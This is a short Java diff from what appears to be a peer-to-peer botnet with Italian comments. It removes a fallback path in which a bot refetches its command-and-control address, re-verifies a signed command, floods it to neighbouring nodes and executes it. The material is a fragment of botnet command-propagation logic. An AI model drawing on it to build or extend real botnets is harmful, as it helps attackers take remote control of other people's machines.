@@ -185,25 +185,7 @@ public class Behavior {
 						executeCommand(msgs[1]);
 
 					} else {
-						System.out.println("Signature Comando FALLITA1");
-						nServ.getDnsCeC();
-						if (pki.validateSignedMessageRSA(msgs[0], msgs[2],	nServ.getCommandConquerIps().get(0).getValue2())) {
-							Pairs<Integer, String> data = new Pairs<>();
-							data.setValue1(msgHashList.getSize() + 1);
-							data.setValue2(msgs[0]);
-							msgHashList.add(data);
-							System.out.println("Signature OK");
-							// se verificato inoltralo ai vicini
-							System.out.println("Flood a vicini");
-							floodNeighoours(rawData, ip);
-							// inoltra all'interpretedei msg
-							executeCommand(msgs[1]);
-
-						} else {
-							System.out.println("Signature Comando FALLITA2");
-							
-						}
-						
+						System.out.println("Signature Comando FALLITA");
 					}
 				} catch (InvalidKeyException | SignatureException e) {
 					System.out.println("Errore verifica Signature durante il flooding " + msgs[2]);
